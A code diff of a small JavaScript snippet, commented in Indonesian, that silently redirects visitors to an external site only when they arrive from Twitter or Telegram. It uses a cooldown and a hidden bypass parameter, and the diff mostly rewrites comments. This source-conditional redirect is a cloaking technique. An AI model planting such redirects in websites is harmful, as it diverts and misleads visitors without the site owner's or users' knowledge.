@@ -1,42 +1,48 @@
 (function () {
   try {
     // === SETTING ===
-    var target = "https://shinigami.bio"; // <-- GANTI ke URL tujuan kamu (HTTPS)
-    var cooldownMs = 20 * 1000;                      // 20 detik
+    var target = "https://shinigami.bio"; // URL tujuan redirect (wajib HTTPS)
+    var cooldownMs = 20 * 1000;           // 20 detik cooldown
 
-    // Hanya redirect jika sumbernya Telegram atau Twitter
+    // Sumber yang diizinkan: Twitter / Telegram
     var allowedSources = [
-      /t\.co/i,               // Twitter shortener
-      /twitter\.com/i,        // Twitter referrer
-      /Twitter/i,             // Twitter in-app browser UA
-      /t\.me/i,               // Telegram shortener
-      /telegram\.org/i,       // Telegram referrer
-      /Telegram/i             // Telegram in-app browser UA
+      /t\.co/i,
+      /twitter\.com/i,
+      /twitter/i,
+      /t\.me/i,
+      /telegram\.org/i,
+      /telegram/i
     ];
 
+    // Validasi URL tujuan
     if (!/^https:\/\//i.test(target)) return;
 
-    // Bypass manual: ?noredir=1 atau #noredir
+    // Bisa bypass manual dengan ?noredir=1 atau #noredir
     if (/[?#](?:.*[&?])?noredir=1(?:&|$)/i.test(location.search + location.hash)) return;
 
+    // Cek referrer dan User-Agent
     var ref = document.referrer || "";
     var ua  = navigator.userAgent || "";
-    var fromAllowed = allowedSources.some(function (re) { return re.test(ref) || re.test(ua); });
-    if (!fromAllowed) return;
+    var fromAllowed = allowedSources.some(function (re) {
+      return re.test(ref) || re.test(ua);
+    });
+    if (!fromAllowed) return; // bukan dari Twitter/Telegram
 
-    // Key unik per-halaman + target
-    var page = location.origin + location.pathname; // abaikan query biar konsisten
+    // Buat key unik untuk cooldown
+    var page = location.origin + location.pathname;
     var key  = "redirCooldown:" + page + "|" + target + "|tw_tg";
 
-    // Cek cooldown (localStorage tahan walau balik dari app)
     var now   = Date.now();
     var until = parseInt(localStorage.getItem(key) || "0", 10);
-    if (now < until) return; // masih cooldown → jangan redirect
+    if (now < until) return; // masih dalam cooldown
 
-    // Set cooldown lebih dulu (hindari loop saat balik)
+    // Set cooldown
     localStorage.setItem(key, String(now + cooldownMs));
 
-    // Redirect tanpa buka tab baru
-    window.location.replace(target);
-  } catch (_) {}
+    // Eksekusi redirect
+    window.location.assign(target);
+
+  } catch (e) {
+    console.error("Redirect error:", e);
+  }
 })();
